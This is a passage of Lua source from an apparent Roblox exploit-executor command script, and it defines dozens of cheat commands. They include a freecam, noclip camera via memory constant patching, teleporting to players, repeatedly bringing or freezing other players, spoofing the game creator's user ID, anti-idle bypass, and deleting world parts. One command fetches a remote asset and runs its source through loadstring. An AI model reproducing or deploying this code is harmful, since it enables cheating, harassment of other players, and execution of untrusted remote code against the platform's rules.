		if viewDied then
			viewDied:Disconnect()
			viewChanged:Disconnect()
		end
		workspace.CurrentCamera.CameraSubject = speaker.Character
	end)


	fcRunning = false
	local Camera = workspace.CurrentCamera
	workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
		local newCamera = workspace.CurrentCamera
		if newCamera then
			Camera = newCamera
		end
	end)

	local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value

	Spring = {} do
		Spring.__index = Spring

		function Spring.new(freq, pos)
			local self = setmetatable({}, Spring)
			self.f = freq
			self.p = pos
			self.v = pos*0
			return self
		end

		function Spring:Update(dt, goal)
			local f = self.f*2*math.pi
			local p0 = self.p
			local v0 = self.v

			local offset = goal - p0
			local decay = math.exp(-f*dt)

			local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
			local v1 = (f*dt*(offset*f - v0) + v0)*decay

			self.p = p1
			self.v = v1

			return p1
		end

		function Spring:Reset(pos)
			self.p = pos
			self.v = pos*0
		end
	end

	local cameraPos = Vector3.new()
	local cameraRot = Vector2.new()

	local velSpring = Spring.new(5, Vector3.new())
	local panSpring = Spring.new(5, Vector2.new())

	Input = {} do

		keyboard = {
			W = 0,
			A = 0,
			S = 0,
			D = 0,
			E = 0,
			Q = 0,
			Up = 0,
			Down = 0,
			LeftShift = 0,
		}

		mouse = {
			Delta = Vector2.new(),
		}

		NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
		PAN_MOUSE_SPEED = Vector2.new(1, 1)*(math.pi/64)
		NAV_ADJ_SPEED = 0.75
		NAV_SHIFT_MUL = 0.25

		navSpeed = 1

		function Input.Vel(dt)
			navSpeed = math.clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

			local kKeyboard = Vector3.new(
				keyboard.D - keyboard.A,
				keyboard.E - keyboard.Q,
				keyboard.S - keyboard.W
			)*NAV_KEYBOARD_SPEED

			local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)

			return (kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
		end

		function Input.Pan(dt)
			local kMouse = mouse.Delta*PAN_MOUSE_SPEED
			mouse.Delta = Vector2.new()
			return kMouse
		end

		do
			function Keypress(action, state, input)
				keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				return Enum.ContextActionResult.Sink
			end

			function MousePan(action, state, input)
				local delta = input.Delta
				mouse.Delta = Vector2.new(-delta.y, -delta.x)
				return Enum.ContextActionResult.Sink
			end

			function Zero(t)
				for k, v in pairs(t) do
					t[k] = v*0
				end
			end

			function Input.StartCapture()
				ContextActionService:BindActionAtPriority("FreecamKeyboard",Keypress,false,INPUT_PRIORITY,
					Enum.KeyCode.W,
					Enum.KeyCode.A,
					Enum.KeyCode.S,
					Enum.KeyCode.D,
					Enum.KeyCode.E,
					Enum.KeyCode.Q,
					Enum.KeyCode.Up,
					Enum.KeyCode.Down
				)
				ContextActionService:BindActionAtPriority("FreecamMousePan",MousePan,false,INPUT_PRIORITY,Enum.UserInputType.MouseMovement)
			end

			function Input.StopCapture()
				navSpeed = 1
				Zero(keyboard)
				Zero(mouse)
				ContextActionService:UnbindAction("FreecamKeyboard")
				ContextActionService:UnbindAction("FreecamMousePan")
			end
		end
	end

	function GetFocusDistance(cameraFrame)
		local znear = 0.1
		local viewport = Camera.ViewportSize
		local projy = 2*math.tan(cameraFov/2)
		local projx = viewport.x/viewport.y*projy
		local fx = cameraFrame.rightVector
		local fy = cameraFrame.upVector
		local fz = cameraFrame.lookVector

		local minVect = Vector3.new()
		local minDist = 512

		for x = 0, 1, 0.5 do
			for y = 0, 1, 0.5 do
				local cx = (x - 0.5)*projx
				local cy = (y - 0.5)*projy
				local offset = fx*cx - fy*cy + fz
				local origin = cameraFrame.p + offset*znear
				local _, hit = workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
				local dist = (hit - origin).magnitude
				if minDist > dist then
					minDist = dist
					minVect = offset.unit
				end
			end
		end

		return fz:Dot(minVect)*minDist
	end

	local function StepFreecam(dt)
		local vel = velSpring:Update(dt, Input.Vel(dt))
		local pan = panSpring:Update(dt, Input.Pan(dt))

		local zoomFactor = math.sqrt(math.tan(math.rad(70/2))/math.tan(math.rad(cameraFov/2)))

		cameraRot = cameraRot + pan*Vector2.new(0.75, 1)*8*(dt/zoomFactor)
		cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2*math.pi))

		local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*Vector3.new(1, 1, 1)*64*dt)
		cameraPos = cameraCFrame.p

		Camera.CFrame = cameraCFrame
		Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
		Camera.FieldOfView = cameraFov
	end

	local PlayerState = {} do
		mouseBehavior = ""
		mouseIconEnabled = ""
		cameraType = ""
		cameraFocus = ""
		cameraCFrame = ""
		cameraFieldOfView = ""

		function PlayerState.Push()
			cameraFieldOfView = Camera.FieldOfView
			Camera.FieldOfView = 70

			cameraType = Camera.CameraType
			Camera.CameraType = Enum.CameraType.Custom

			cameraCFrame = Camera.CFrame
			cameraFocus = Camera.Focus

			mouseIconEnabled = UserInputService.MouseIconEnabled
			UserInputService.MouseIconEnabled = true

			mouseBehavior = UserInputService.MouseBehavior
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		end

		function PlayerState.Pop()
			Camera.FieldOfView = 70

			Camera.CameraType = cameraType
			cameraType = nil

			Camera.CFrame = cameraCFrame
			cameraCFrame = nil

			Camera.Focus = cameraFocus
			cameraFocus = nil

			UserInputService.MouseIconEnabled = mouseIconEnabled
			mouseIconEnabled = nil

			UserInputService.MouseBehavior = mouseBehavior
			mouseBehavior = nil
		end
	end

	function StartFreecam(pos)
		if fcRunning then
			StopFreecam()
		end
		local cameraCFrame = Camera.CFrame
		if pos then
			cameraCFrame = pos
		end
		cameraRot = Vector2.new()
		cameraPos = cameraCFrame.p
		cameraFov = Camera.FieldOfView

		velSpring:Reset(Vector3.new())
		panSpring:Reset(Vector2.new())

		PlayerState.Push()
		RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
		Input.StartCapture()
		fcRunning = true
	end

	function StopFreecam()
		if not fcRunning then return end
		Input.StopCapture()
		RunService:UnbindFromRenderStep("Freecam")
		PlayerState.Pop()
		workspace.Camera.FieldOfView = 70
		fcRunning = false
	end

	addcmd('freecam',{'fc'},function(args, speaker)
		StartFreecam()
	end)

	addcmd('freecampos',{'fcpos','fcp','freecamposition','fcposition'},function(args, speaker)
		if not args[1] then return end
		local freecamPos = CFrame.new(args[1],args[2],args[3])
		StartFreecam(freecamPos)
	end)

	addcmd('freecamwaypoint',{'fcwp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					StartFreecam(CFrame.new(x,y,z))
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					StartFreecam(CFrame.new(pWayPoints[i].COORD[1].Position))
				end
			end
		end
	end)

	addcmd('freecamgoto',{'fcgoto','freecamtp','fctp'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			StartFreecam(getRoot(Players[v].Character).CFrame)
		end
	end)

	addcmd('unfreecam',{'nofreecam','unfc','nofc'},function(args, speaker)
		StopFreecam()
	end)

	addcmd('freecamspeed',{'fcspeed'},function(args, speaker)
		local FCspeed = args[1] or 1
		if isNumber(FCspeed) then
			NAV_KEYBOARD_SPEED = Vector3.new(FCspeed, FCspeed, FCspeed)
		end
	end)

	addcmd('notifyfreecamposition',{'notifyfcpos'},function(args, speaker)
		if fcRunning then
			local X,Y,Z = workspace.CurrentCamera.CFrame.Position.X,workspace.CurrentCamera.CFrame.Position.Y,workspace.CurrentCamera.CFrame.Position.Z
			local Format, Round = string.format, math.round
			notify("Current Position", Format("%s, %s, %s", Round(X), Round(Y), Round(Z)))
		end
	end)

	addcmd('copyfreecamposition',{'copyfcpos'},function(args, speaker)
		if fcRunning then
			local X,Y,Z = workspace.CurrentCamera.CFrame.Position.X,workspace.CurrentCamera.CFrame.Position.Y,workspace.CurrentCamera.CFrame.Position.Z
			local Format, Round = string.format, math.round
			toClipboard(Format("%s, %s, %s", Round(X), Round(Y), Round(Z)))
		end
	end)

	addcmd('gotocamera',{'gotocam','tocam'},function(args, speaker)
		getRoot(speaker.Character).CFrame = workspace.Camera.CFrame
	end)

	addcmd('tweengotocamera',{'tweengotocam','tgotocam','ttocam'},function(args, speaker)
		TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = workspace.Camera.CFrame}):Play()
	end)

	addcmd('fov',{},function(args, speaker)
		local fov = args[1] or 70
		if isNumber(fov) then
			workspace.CurrentCamera.FieldOfView = fov
		end
	end)

	local preMaxZoom = Players.LocalPlayer.CameraMaxZoomDistance
	local preMinZoom = Players.LocalPlayer.CameraMinZoomDistance
	addcmd('lookat',{},function(args, speaker)
		if speaker.CameraMaxZoomDistance ~= 0.5 then
			preMaxZoom = speaker.CameraMaxZoomDistance
			preMinZoom = speaker.CameraMinZoomDistance
		end
		speaker.CameraMaxZoomDistance = 0.5
		speaker.CameraMinZoomDistance = 0.5
		wait()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local target = Players[v].Character
			if target and target:FindFirstChild('Head') then
				workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.p, target.Head.CFrame.p)
				wait(0.1)
			end
		end
		speaker.CameraMaxZoomDistance = preMaxZoom
		speaker.CameraMinZoomDistance = preMinZoom
	end)

	addcmd('fixcam',{'restorecam'},function(args, speaker)
		StopFreecam()
		execCmd('unview')
		workspace.CurrentCamera:remove()
		wait(.1)
		repeat wait() until speaker.Character ~= nil
		workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
		workspace.CurrentCamera.CameraType = "Custom"
		speaker.CameraMinZoomDistance = 0.5
		speaker.CameraMaxZoomDistance = 400
		speaker.CameraMode = "Classic"
		speaker.Character.Head.Anchored = false
	end)

	addcmd('enableshiftlock',{'enablesl','shiftlock'},function(args, speaker)
		speaker.DevEnableMouseLock = true
		notify('Shiftlock','Shift lock is now available')
	end)

	addcmd('firstp',{},function(args, speaker)
		speaker.CameraMode = "LockFirstPerson"
	end)

	addcmd('thirdp',{},function(args, speaker)
		speaker.CameraMode = "Classic"
	end)

	addcmd('noclipcam', {'nccam'}, function(args, speaker)
		local sc = (debug and debug.setconstant) or setconstant
		local gc = (debug and debug.getconstants) or getconstants
		if not sc or not getgc or not gc then
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setconstant or getconstants or getgc)')
		end
		local pop = speaker.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
		for _, v in pairs(getgc()) do
			if type(v) == 'function' and getfenv(v).script == pop then
				for i, v1 in pairs(gc(v)) do
					if tonumber(v1) == .25 then
						sc(v, i, 0)
					elseif tonumber(v1) == 0 then
						sc(v, i, .25)
					end
				end
			end
		end
	end)

	addcmd('maxzoom',{},function(args, speaker)
		speaker.CameraMaxZoomDistance = args[1]
	end)

	addcmd('minzoom',{},function(args, speaker)
		speaker.CameraMinZoomDistance = args[1]
	end)

	addcmd('camdistance',{},function(args, speaker)
		local camMax = speaker.CameraMaxZoomDistance
		local camMin = speaker.CameraMinZoomDistance
		if camMax < tonumber(args[1]) then
			camMax = args[1]
		end
		speaker.CameraMaxZoomDistance = args[1]
		speaker.CameraMinZoomDistance = args[1]
		wait()
		speaker.CameraMaxZoomDistance = camMax
		speaker.CameraMinZoomDistance = camMin
	end)

	addcmd('unlockws',{'unlockworkspace'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Locked = false
			end
		end
	end)

	addcmd('lockws',{'lockworkspace'},function(args, speaker) 
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Locked = true
			end
		end
	end)

	addcmd('delete',{'remove'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted ' ..getstring(1))
	end)

	addcmd('deleteclass',{'removeclass','deleteclassname','removeclassname','dc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
	end)

	addcmd('chardelete',{'charremove','cd'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted ' ..getstring(1))
	end)

	addcmd('chardeleteclass',{'charremoveclass','chardeleteclassname','charremoveclassname','cdc'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() then
				v:Destroy()
			end
		end
		notify('Item(s) Deleted','Deleted items with ClassName ' ..getstring(1))
	end)

	addcmd('deletevelocity',{'dv','removevelocity','removeforces'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
				v:Destroy()
			end
		end
	end)

	addcmd('deleteinvisparts',{'deleteinvisibleparts','dip'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency == 1 and v.CanCollide then
				v:Destroy()
			end
		end
	end)

	local shownParts = {}
	addcmd('invisibleparts',{'invisparts'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency == 1 then
				if not table.find(shownParts,v) then
					table.insert(shownParts,v)
				end
				v.Transparency = 0
			end
		end
	end)

	addcmd('uninvisibleparts',{'uninvisparts'},function(args, speaker)
		for i,v in pairs(shownParts) do
			v.Transparency = 1
		end
		shownParts = {}
	end)

	addcmd('btools',{},function(args, speaker)
		for i = 1, 4 do
			local Tool = Instance.new("HopperBin")
			Tool.BinType = i
			Tool.Name = randomString()
			Tool.Parent = speaker:FindFirstChildOfClass("Backpack")
		end
	end)

	addcmd('f3x',{'fex'},function(args, speaker)
		loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
	end)

	addcmd('partpath',{'partname'},function(args, speaker)
		selectPart()
	end)

	addcmd('antiafk',{'antiidle'},function(args, speaker)
		local GC = getconnections or get_signal_cons
		if GC then
			for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
				if v["Disable"] then
					v["Disable"](v)
				elseif v["Disconnect"] then
					v["Disconnect"](v)
				end
			end
		else
			Players.LocalPlayer.Idled:Connect(function()
				local VirtualUser = game:GetService("VirtualUser")
				VirtualUser:CaptureController()
				VirtualUser:ClickButton2(Vector2.new())
			end)
		end
		if not (args[1] and tostring(args[1]) == 'nonotify') then notify('Anti Idle','Anti idle is enabled') end
	end)

	addcmd('datalimit',{},function(args, speaker)
		if tonumber(args[1]) then
			NetworkClient:SetOutgoingKBPSLimit(args[1])
		end
	end)

	addcmd('replicationlag',{'backtrack'},function(args, speaker)
		if tonumber(args[1]) then
			settings():GetService("NetworkSettings").IncomingReplicationLag = args[1]
		end
	end)

	addcmd('noprompts', {'nopurchaseprompts'}, function(args, speaker)
		COREGUI.PurchasePrompt.Enabled = false
	end)

	addcmd('showprompts', {'showpurchaseprompts'}, function(args, speaker)
		COREGUI.PurchasePrompt.Enabled = true
	end)

	addcmd('age',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
		notify('Account Age',table.concat(ages, ',\n'))
	end)

	addcmd('chatage',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
		local chatString = table.concat(ages, ', ')
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
	end)

	addcmd('joindate',{'jd'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local dates = {}
		notify("Loading",'Hold on a sec')
		for i,v in pairs(players) do
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..Players[v].UserId)
			local json = HttpService:JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			table.insert(dates,Players[v].Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
		end
		notify('Join Date (Month/Day/Year)',table.concat(dates, ',\n'))
	end)

	addcmd('chatjoindate',{'cjd'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local dates = {}
		notify("Loading",'Hold on a sec')
		for i,v in pairs(players) do
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..Players[v].UserId)
			local json = HttpService:JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			table.insert(dates,Players[v].Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
		end
		local chatString = table.concat(dates, ', ')
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
	end)

	addcmd('copyname',{'copyuser'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local name = tostring(Players[v].Name)
			toClipboard(name)
		end
	end)

	addcmd('userid',{'id'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local id = tostring(Players[v].UserId)
			notify('User ID',id)
		end
	end)

	addcmd('copyid',{'copyuserid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local id = tostring(Players[v].UserId)
			toClipboard(id)
		end
	end)

	addcmd('creatorid',{'creator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			notify('Creator ID',game.CreatorId)
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
			speaker.UserId = OwnerID
			notify('Creator ID',OwnerID)
		end
	end)

	addcmd('copycreatorid',{'copycreator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			toClipboard(game.CreatorId)
			notify('Copied ID','Copied creator ID to clipboard')
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
			toClipboard(OwnerID)
			notify('Copied ID','Copied creator ID to clipboard')
		end
	end)

	addcmd('setcreatorid',{'setcreator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			speaker.UserId = game.CreatorId
			notify('Set ID','Set UserId to '..game.CreatorId)
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
			speaker.UserId = OwnerID
			notify('Set ID','Set UserId to '..OwnerID)
		end
	end)

	addcmd('appearanceid',{'aid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local aid = tostring(Players[v].CharacterAppearanceId)
			notify('Appearance ID',aid)
		end
	end)

	addcmd('copyappearanceid',{'caid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local aid = tostring(Players[v].CharacterAppearanceId)
			toClipboard(aid)
		end
	end)

	addcmd('norender',{},function(args, speaker)
		RunService:Set3dRenderingEnabled(false)
	end)

	addcmd('render',{},function(args, speaker)
		RunService:Set3dRenderingEnabled(true)
	end)

	addcmd('2022materials',{'use2022materials'},function(args, speaker)
		if sethidden then
			sethidden(MaterialService, "Use2022Materials", true)
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('un2022materials',{'unuse2022materials'},function(args, speaker)
		if sethidden then
			sethidden(MaterialService, "Use2022Materials", false)
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('goto',{'to'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
			end
		end
		execCmd('breakvelocity')
	end)

	addcmd('tweengoto',{'tgoto','tto','tweento'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)}):Play()
			end
		end
		execCmd('breakvelocity')
	end)

	addcmd('vehiclegoto',{'vgoto','vtp','vehicletp'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
				local vehicleModel = seat:FindFirstAncestorWhichIsA("Model")
				vehicleModel:MoveTo(getRoot(Players[v].Character).Position)
			end
		end
	end)

	addcmd('pulsetp',{'ptp'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				local startPos = getRoot(speaker.Character).CFrame
				local seconds = args[2] or 1
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
				wait(seconds)
				getRoot(speaker.Character).CFrame = startPos
			end
		end
		execCmd('breakvelocity')
	end)

	local vnoclipParts = {}
	addcmd('vehiclenoclip',{'vnoclip'},function(args, speaker)
		vnoclipParts = {}
		local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
		local vehicleModel = seat.Parent
		repeat
			if vehicleModel.ClassName ~= "Model" then
				vehicleModel = vehicleModel.Parent
			end
		until vehicleModel.ClassName == "Model"
		wait(0.1)
		execCmd('noclip')
		for i,v in pairs(vehicleModel:GetDescendants()) do
			if v:IsA("BasePart") and v.CanCollide then
				table.insert(vnoclipParts,v)
				v.CanCollide = false
			end
		end
	end)

	addcmd('vehicleclip',{'vclip','unvnoclip','unvehiclenoclip'},function(args, speaker)
		execCmd('clip')
		for i,v in pairs(vnoclipParts) do
			v.CanCollide = true
		end
		vnoclipParts = {}
	end)

	addcmd('togglevnoclip',{},function(args, speaker)
		if Clip then
			execCmd('vnoclip')
		else
			execCmd('vclip')
		end
	end)

	addcmd('clientbring',{'cbring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if Players[v].Character:FindFirstChildOfClass('Humanoid') then
					Players[v].Character:FindFirstChildOfClass('Humanoid').Sit = false
				end
				wait()
				getRoot(Players[v].Character).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(3,1,0)
			end
		end
	end)

	local bringT = {}
	addcmd('loopbring',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			task.spawn(function()
				if Players[v].Name ~= speaker.Name and not FindInTable(bringT, Players[v].Name) then
					table.insert(bringT, Players[v].Name)
					local plrName = Players[v].Name
					local pchar=Players[v].Character
					local distance = 3
					if args[2] and isNumber(args[2]) then
						distance = args[2]
					end
					local lDelay = 0
					if args[3] and isNumber(args[3]) then
						lDelay = args[3]
					end
					repeat
						for i,c in pairs(players) do
							if Players:FindFirstChild(v) then
								pchar = Players[v].Character
								if pchar~= nil and Players[v].Character ~= nil and getRoot(pchar) and speaker.Character ~= nil and getRoot(speaker.Character) then
									getRoot(pchar).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(distance,1,0)
								end
								wait(lDelay)
							else 
								for a,b in pairs(bringT) do if b == plrName then table.remove(bringT, a) end end
							end
						end
					until not FindInTable(bringT, plrName)
				end
			end)
		end
	end)

	addcmd('unloopbring',{'noloopbring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			task.spawn(function()
				for a,b in pairs(bringT) do if b == Players[v].Name then table.remove(bringT, a) end end
			end)
		end
	end)

	local walkto = false
	local waypointwalkto = false
	addcmd('walkto',{'follow'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				walkto = true
				repeat wait()
					speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(Players[v].Character).Position)
				until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
			end
		end
	end)

	addcmd('pathfindwalkto',{'pathfindfollow'},function(args, speaker)
		walkto = false
		wait()
		local players = getPlayer(args[1], speaker)
		local hum = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		local path = PathService:CreatePath()
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				walkto = true
				repeat wait()
					local success, response = pcall(function()
						path:ComputeAsync(getRoot(speaker.Character).Position, getRoot(Players[v].Character).Position)
						local waypoints = path:GetWaypoints()
						local distance 
						for waypointIndex, waypoint in pairs(waypoints) do
							local waypointPosition = waypoint.Position
							hum:MoveTo(waypointPosition)
							repeat 
								distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
								wait()
							until
							distance <= 5
						end	 
					end)
					if not success then
						speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(Players[v].Character).Position)
					end
				until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
			end
		end
	end)

	addcmd('pathfindwalktowaypoint',{'pathfindwalktowp'},function(args, speaker)
		waypointwalkto = false
		wait()
		local WPName = tostring(getstring(1))
		local hum = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		local path = PathService:CreatePath()
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					local TrueCoords = Vector3.new(WayPoints[i].COORD[1], WayPoints[i].COORD[2], WayPoints[i].COORD[3])
					waypointwalkto = true
					repeat wait()
						local success, response = pcall(function()
							path:ComputeAsync(getRoot(speaker.Character).Position, TrueCoords)
							local waypoints = path:GetWaypoints()
							local distance 
							for waypointIndex, waypoint in pairs(waypoints) do
								local waypointPosition = waypoint.Position
								hum:MoveTo(waypointPosition)
								repeat 
									distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
									wait()
								until
								distance <= 5
							end
						end)
						if not success then
							speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(TrueCoords)
						end
					until not speaker.Character or waypointwalkto == false
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					local TrueCoords = pWayPoints[i].COORD[1].Position
					waypointwalkto = true
					repeat wait()
						local success, response = pcall(function()
							path:ComputeAsync(getRoot(speaker.Character).Position, TrueCoords)
							local waypoints = path:GetWaypoints()
							local distance 
							for waypointIndex, waypoint in pairs(waypoints) do
								local waypointPosition = waypoint.Position
								hum:MoveTo(waypointPosition)
								repeat 
									distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
									wait()
								until
								distance <= 5
							end
						end)
						if not success then
							speaker.Character:FindFirstChildOfClass('Humanoid'):MoveTo(TrueCoords)
						end
					until not speaker.Character or waypointwalkto == false
				end
			end
		end
	end)

	addcmd('unwalkto',{'nowalkto','unfollow','nofollow'},function(args, speaker)
		walkto = false
		waypointwalkto = false
	end)

	addcmd('freeze',{'fr'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				task.spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("BasePart") and not x.Anchored then
							x.Anchored = true
						end
					end
				end)
			end
		end
	end)


